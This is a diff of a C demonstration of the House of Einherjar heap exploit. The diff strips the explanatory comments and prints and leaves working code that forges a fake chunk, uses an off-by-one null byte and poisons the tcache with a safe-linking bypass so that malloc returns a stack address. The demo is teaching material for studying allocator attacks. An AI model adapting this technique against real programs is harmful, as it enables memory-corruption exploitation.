@@ -39,9 +39,6 @@ int main()
 	setbuf(stdin, NULL);
 	setbuf(stdout, NULL);
 
-	printf("Welcome to House of Einherjar!\n");
-
-	// 1. Prepare target aligned address on stack
 	intptr_t stack_var[0x10];
 	intptr_t *target = NULL;
 	for(int i=0; i<0x10; i++) {
@@ -52,63 +49,48 @@ int main()
 	}
 	assert(target != NULL);
 
-	// 2. Create a fake chunk on the heap
-	printf("\nAllocating 'a' to hold the fake chunk\n");
 	intptr_t *a = malloc(0x38);
 
-	// Bypass unlink checks by pointing fwd/bck to the chunk itself
-	a[0] = 0;               // prev_size
-	a[1] = 0x60;            // size
-	a[2] = (size_t) a;  // fwd
-	a[3] = (size_t) a;  // bck
+	// Forge fake chunk
+	a[0] = 0;               
+	a[1] = 0x60;            
+	a[2] = (size_t) a;  
+	a[3] = (size_t) a;  
 
-	// 3. Allocate chunks for the overflow
-	printf("\nAllocating 'b' (overflow source) and 'c' (target)\n");
 	uint8_t *b = (uint8_t *) malloc(0x28);
 	int real_b_size = malloc_usable_size(b);
 	uint8_t *c = (uint8_t *) malloc(0xf8);
 
-	// 4. Trigger the off-by-one null byte
-	// This clears the PREV_INUSE bit of 'c'
-	printf("\nOverflowing 'b' with a null byte into 'c' metadata\n");
+	// VULNERABILITY: Off-by-one null byte
 	b[real_b_size] = 0;
 
-	// 5. Forge prev_size in 'b'
-	// prev_size must point exactly to our fake chunk 'a'
+	// Forge prev_size
 	size_t fake_size = (size_t)((c - sizeof(size_t) * 2) - (uint8_t*) a);
 	*(size_t*) &b[real_b_size-sizeof(size_t)] = fake_size;
-
-	// Update fake chunk size to match the forged prev_size
 	a[1] = fake_size;
 
-	// 6. Bypass tcache for consolidation
-	printf("\nFilling tcache for 0x100 size chunks\n");
+	// Fill tcache
 	intptr_t *x[7];
 	for(int i=0; i<7; i++) x[i] = malloc(0xf8);
 	for(int i=0; i<7; i++) free(x[i]);
 
-	// 7. Trigger backward consolidation
-	printf("\nFreeing 'c' to trigger House of Einherjar\n");
+	// Trigger backward consolidation
 	free(c);
 
-	// 8. Overlap and Poison
-	// Malloc returns a chunk that overlaps 'b'
 	intptr_t *d = malloc(0x158);
 
-	// Use the overlap to poison tcache for chunk 'b'
 	uint8_t *pad = malloc(0x28);
 	free(pad);
 	free(b);
 
-	// Hijack b's fd pointer (with safe-linking bypass)
+	// VULNERABILITY: Tcache Poisoning (overlapping chunk)
 	d[0x30 / 8] = (long)target ^ ((long)&d[0x30/8] >> 12);
 
-	// 9. Allocation on stack
 	malloc(0x28);
 	intptr_t *e = malloc(0x28);
-	printf("\nThe new chunk is at %p (target: %p)\n", e, target);
 
 	assert(e == target);
+	return 0;
 }
 ```
 
